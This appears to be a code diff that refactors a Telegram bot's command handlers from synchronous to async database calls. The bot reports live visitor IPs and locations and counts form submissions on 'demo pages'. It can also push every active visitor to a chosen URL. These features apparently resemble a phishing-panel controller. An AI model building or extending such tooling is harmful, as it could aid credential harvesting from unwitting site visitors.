@@ -4,7 +4,7 @@
  * Each function receives (bot, msg, website) and responds to the chat.
  */
 
-const { getDb } = require('../database/init');
+const { getAdapter } = require('../database/adapter');
 
 // ─── HTML escape helper ───────────────────────────────────────────────────────
 function esc(text) {
@@ -70,37 +70,26 @@ async function handleStats(bot, msg, website) {
   if (!isAuthorized(msg.from.id, website)) return sendDenied(bot, chatId);
 
   try {
-    const db = getDb();
+    const db = getAdapter();
     const wid = website.id;
+    const todayISO = new Date(new Date().setHours(0, 0, 0, 0)).toISOString();
 
-    const active = db.prepare(
-      'SELECT COUNT(*) as n FROM sessions WHERE website_id = ? AND is_active = 1'
-    ).get(wid);
-
-    const today = db.prepare(
-      "SELECT COUNT(*) as n FROM sessions WHERE website_id = ? AND date(started_at) = date('now')"
-    ).get(wid);
-
-    const pv = db.prepare(
-      "SELECT COUNT(*) as n FROM page_views WHERE website_id = ? AND date(timestamp) = date('now')"
-    ).get(wid);
-
-    const total = db.prepare(
-      'SELECT COUNT(*) as n FROM sessions WHERE website_id = ?'
-    ).get(wid);
-
-    const subs = db.prepare(
-      'SELECT SUM(submissions_count) as n FROM demo_pages WHERE website_id = ?'
-    ).get(wid);
+    const [active, today, pv, total, subs] = await Promise.all([
+      db.get('SELECT COUNT(*) as n FROM sessions WHERE website_id = ? AND is_active = 1', [wid]),
+      db.get('SELECT COUNT(*) as n FROM sessions WHERE website_id = ? AND started_at >= ?', [wid, todayISO]),
+      db.get('SELECT COUNT(*) as n FROM page_views WHERE website_id = ? AND timestamp >= ?', [wid, todayISO]),
+      db.get('SELECT COUNT(*) as n FROM sessions WHERE website_id = ?', [wid]),
+      db.get('SELECT SUM(submissions_count) as n FROM demo_pages WHERE website_id = ?', [wid])
+    ]);
 
     const text = [
       `📊 <b>${esc(website.name)} — Live Stats</b>`,
       ``,
-      `🟢 <b>Active Visitors:</b> ${active.n}`,
-      `📅 <b>Sessions Today:</b> ${today.n}`,
-      `👁 <b>Page Views Today:</b> ${pv.n}`,
-      `🗂 <b>Total Sessions:</b> ${total.n}`,
-      `📝 <b>Total Submissions:</b> ${subs.n || 0}`,
+      `🟢 <b>Active Visitors:</b> ${active?.n || 0}`,
+      `📅 <b>Sessions Today:</b> ${today?.n || 0}`,
+      `👁 <b>Page Views Today:</b> ${pv?.n || 0}`,
+      `🗂 <b>Total Sessions:</b> ${total?.n || 0}`,
+      `📝 <b>Total Submissions:</b> ${subs?.n || 0}`,
       ``,
       `💡 <b>Status:</b> ${website.is_active ? '🟢 Online' : '🔴 Offline'}`,
       `🌍 <b>Domain:</b> ${esc(website.domain || 'Not set')}`,
@@ -119,14 +108,14 @@ async function handleVisitors(bot, msg, website) {
   if (!isAuthorized(msg.from.id, website)) return sendDenied(bot, chatId);
 
   try {
-    const db = getDb();
-    const sessions = db.prepare(`
+    const db = getAdapter();
+    const sessions = await db.all(`
       SELECT id, ip_address, country, city, browser, os, current_page, started_at
       FROM sessions
       WHERE website_id = ? AND is_active = 1
       ORDER BY started_at DESC
       LIMIT 10
-    `).all(website.id);
+    `, [website.id]);
 
     if (sessions.length === 0) {
       return bot.sendMessage(chatId,
@@ -167,29 +156,32 @@ async function handleRedirect(bot, msg, website, args) {
   }
 
   try {
-    const db = getDb();
-    const sessions = db.prepare(
-      'SELECT id FROM sessions WHERE website_id = ? AND is_active = 1'
-    ).all(website.id);
+    const db = getAdapter();
+    const sessions = await db.all(
+      'SELECT id FROM sessions WHERE website_id = ? AND is_active = 1',
+      [website.id]
+    );
 
     if (sessions.length === 0) {
       return bot.sendMessage(chatId, '↗️ No active visitors to redirect.', { parse_mode: 'HTML' });
     }
 
-    const insert = db.prepare(
-      'INSERT INTO redirect_commands (session_id, website_id, target_url, executed_by) VALUES (?, ?, ?, NULL)'
-    );
-    const insertMany = db.transaction((list) => {
-      for (const s of list) insert.run(s.id, website.id, targetUrl);
-    });
-    insertMany(sessions);
+    for (const s of sessions) {
+      await db.run(
+        'INSERT INTO redirect_commands (session_id, website_id, target_url, executed_by) VALUES (?, ?, ?, NULL)',
+        [s.id, website.id, targetUrl]
+      );
+    }
 
-    db.prepare(`
-      INSERT INTO audit_logs (user_id, username, action, category, details, ip_address)
-      VALUES (NULL, 'telegram-bot', ?, 'redirect', ?, 'telegram')
-    `).run(
-      `Bot redirected ${sessions.length} visitor(s) on ${website.name}`,
-      JSON.stringify({ website_id: website.id, target_url: targetUrl, count: sessions.length })
+    await db.run(
+      'INSERT INTO audit_logs (user_id, username, action, category, details, ip_address) VALUES (NULL, ?, ?, ?, ?, ?)',
+      [
+        'telegram-bot',
+        `Bot redirected ${sessions.length} visitor(s) on ${website.name}`,
+        'redirect',
+        JSON.stringify({ website_id: website.id, target_url: targetUrl, count: sessions.length }),
+        'telegram'
+      ]
     );
 
     return bot.sendMessage(chatId,
@@ -207,16 +199,19 @@ async function handleToggle(bot, msg, website) {
   if (!isAuthorized(msg.from.id, website)) return sendDenied(bot, chatId);
 
   try {
-    const db = getDb();
+    const db = getAdapter();
     const newState = website.is_active ? 0 : 1;
-    db.prepare('UPDATE websites SET is_active = ? WHERE id = ?').run(newState, website.id);
+    await db.run('UPDATE websites SET is_active = ? WHERE id = ?', [newState, website.id]);
 
-    db.prepare(`
-      INSERT INTO audit_logs (user_id, username, action, category, details, ip_address)
-      VALUES (NULL, 'telegram-bot', ?, 'website', ?, 'telegram')
-    `).run(
-      `Bot ${newState ? 'activated' : 'deactivated'} website: ${website.name}`,
-      JSON.stringify({ website_id: website.id, is_active: newState })
+    await db.run(
+      'INSERT INTO audit_logs (user_id, username, action, category, details, ip_address) VALUES (NULL, ?, ?, ?, ?, ?)',
+      [
+        'telegram-bot',
+        `Bot ${newState ? 'activated' : 'deactivated'} website: ${website.name}`,
+        'website',
+        JSON.stringify({ website_id: website.id, is_active: newState }),
+        'telegram'
+      ]
     );
 
     const icon = newState ? '🟢' : '🔴';
@@ -246,15 +241,18 @@ async function handleSetDomain(bot, msg, website, args) {
   }
 
   try {
-    const db = getDb();
-    db.prepare('UPDATE websites SET domain = ? WHERE id = ?').run(domain, website.id);
+    const db = getAdapter();
+    await db.run('UPDATE websites SET domain = ? WHERE id = ?', [domain, website.id]);
 
-    db.prepare(`
-      INSERT INTO audit_logs (user_id, username, action, category, details, ip_address)
-      VALUES (NULL, 'telegram-bot', ?, 'website', ?, 'telegram')
-    `).run(
-      `Bot updated domain for ${website.name} to ${domain}`,
-      JSON.stringify({ website_id: website.id, domain })
+    await db.run(
+      'INSERT INTO audit_logs (user_id, username, action, category, details, ip_address) VALUES (NULL, ?, ?, ?, ?, ?)',
+      [
+        'telegram-bot',
+        `Bot updated domain for ${website.name} to ${domain}`,
+        'website',
+        JSON.stringify({ website_id: website.id, domain }),
+        'telegram'
+      ]
     );
 
     return bot.sendMessage(chatId,
@@ -272,10 +270,11 @@ async function handlePages(bot, msg, website) {
   if (!isAuthorized(msg.from.id, website)) return sendDenied(bot, chatId);
 
   try {
-    const db = getDb();
-    const pages = db.prepare(
-      'SELECT name, url, form_type, views_count, submissions_count FROM demo_pages WHERE website_id = ? ORDER BY id'
-    ).all(website.id);
+    const db = getAdapter();
+    const pages = await db.all(
+      'SELECT name, url, form_type, views_count, submissions_count FROM demo_pages WHERE website_id = ? ORDER BY id',
+      [website.id]
+    );
 
     if (pages.length === 0) {
       return bot.sendMessage(chatId,
@@ -306,14 +305,14 @@ async function handleLogs(bot, msg, website) {
   if (!isAuthorized(msg.from.id, website)) return sendDenied(bot, chatId);
 
   try {
-    const db = getDb();
-    const logs = db.prepare(`
+    const db = getAdapter();
+    const logs = await db.all(`
       SELECT username, action, timestamp
       FROM audit_logs
       WHERE details LIKE ?
       ORDER BY timestamp DESC
       LIMIT 8
-    `).all(`%"website_id":${website.id}%`);
+    `, [`%"website_id":${website.id}%`]);
 
     if (logs.length === 0) {
       return bot.sendMessage(chatId,
